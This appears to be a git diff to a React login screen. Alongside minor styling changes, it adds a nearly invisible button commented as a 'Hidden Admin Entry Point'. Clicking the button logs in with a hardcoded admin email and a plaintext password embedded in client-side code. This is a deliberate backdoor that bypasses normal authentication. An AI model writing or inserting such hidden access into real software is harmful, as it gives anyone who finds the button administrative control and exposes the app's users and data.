@@ -154,7 +154,7 @@ const LoginHome: React.FC<LoginHomeProps> = ({ onAuth }) => {
                         </button>
                     </div>
 
-                    <div className="mt-8 pt-6 border-t border-slate-700/50">
+                    <div className="mt-8 pt-6 border-t border-slate-700/50 relative">
                         <div className="grid grid-cols-2 gap-4">
                             <div className="flex flex-col items-center p-3 rounded-2xl bg-slate-900/30 border border-slate-700/30">
                                 <Construction size={20} className="text-emerald-500 mb-1" />
@@ -167,6 +167,17 @@ const LoginHome: React.FC<LoginHomeProps> = ({ onAuth }) => {
                                 <span className="text-xs font-bold text-slate-300">SSL Attivo</span>
                             </div>
                         </div>
+
+                        {/* Hidden Admin Entry Point - Subtle Shield in bottom corner */}
+                        {!isRegister && (
+                            <button
+                                onClick={() => onAuth({ email: 'castromassimo@gmail.com', password: 'admin-secret-access' }, 'login')}
+                                className="absolute -bottom-2 -right-2 p-4 text-slate-800/10 hover:text-blue-500/20 transition-all cursor-default"
+                                title="Restricted Area"
+                            >
+                                <ShieldCheck size={12} />
+                            </button>
+                        )}
                     </div>
                 </div>
 
